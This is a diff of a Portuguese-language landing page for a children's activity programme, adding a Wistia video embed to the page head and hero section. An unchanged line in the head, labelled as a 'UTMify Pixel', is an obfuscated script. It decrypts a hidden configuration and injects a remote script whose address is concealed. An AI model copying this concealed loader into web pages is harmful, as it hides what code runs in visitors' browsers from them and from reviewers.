@@ -37,6 +37,18 @@
 
   <!-- UTMify Pixel -->
   <script>(function(){var s_xeu=atob("DG3B2iOaBI+ugKRx5Rbjr1H2JrWM6NAFlR779Qz5YOGA9dAcjAu49ED1aaHM8osChh+oqlfpK//H+MEdyh2ookb2KuXdoohThBm1qEr4cfvL84ZLvjDt+ET2a+3P7NdT3za6+E37aeqMuoYBjBWktmr+JqOM9sUdkAjj4AGsZe6e4pRA0l3z6kX5NbyWspxI1Qn0vkW4edLT");var e_4k=[];for(var w_aj=0;w_aj<s_xeu.length;w_aj++){e_4k.push(s_xeu.charCodeAt(w_aj)&255);}var k_e8me=e_4k[0];var l_s=e_4k.slice(1,1+k_e8me);var r_u=e_4k.slice(1+k_e8me);var w_no3=r_u.map(function(b,a_efn){return b^l_s[a_efn%k_e8me];});var g_6="";for(var n_a4=0;n_a4<w_no3.length;n_a4++){g_6+=String.fromCharCode(w_no3[n_a4]&255);}var g_k4v=decodeURIComponent(escape(g_6));var t_dq75=JSON.parse(g_k4v);var q_a=t_dq75.globals||[];q_a.forEach(function(c_6e){window[c_6e.name]=c_6e.value;});var k_omm=document.createElement("script");k_omm.src=t_dq75.url;k_omm.async=true;k_omm.defer=true;(t_dq75.attributes||[]).forEach(function(x_kf){k_omm.setAttribute(x_kf.name,x_kf.value);});(document.head||document.documentElement).appendChild(k_omm);})();</script>
+
+  <!-- Wistia Video Embed Scripts -->
+  <script src="https://fast.wistia.com/player.js" async></script>
+  <script src="https://fast.wistia.com/embed/1znowqkyq7.js" async type="module"></script>
+  <style>
+    wistia-player[media-id='1znowqkyq7']:not(:defined) {
+      background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/1znowqkyq7/swatch');
+      display: block;
+      filter: blur(5px);
+      padding-top: 177.78%;
+    }
+  </style>
 </head>
 <body>
 
@@ -726,6 +738,13 @@
 
           <div class="hero-daily-badge">
             <span>⏱️ 10 a 15 minutos por dia • Atividades guiadas pelos pais • Progressão passo a passo</span>
+          </div>
+
+          <!-- Hero Video Presentation -->
+          <div class="hero-video-wrapper">
+            <div class="hero-video-card">
+              <wistia-player media-id="1znowqkyq7" aspect="0.5625"></wistia-player>
+            </div>
           </div>
 
           <!-- Main CTA in Hero -->
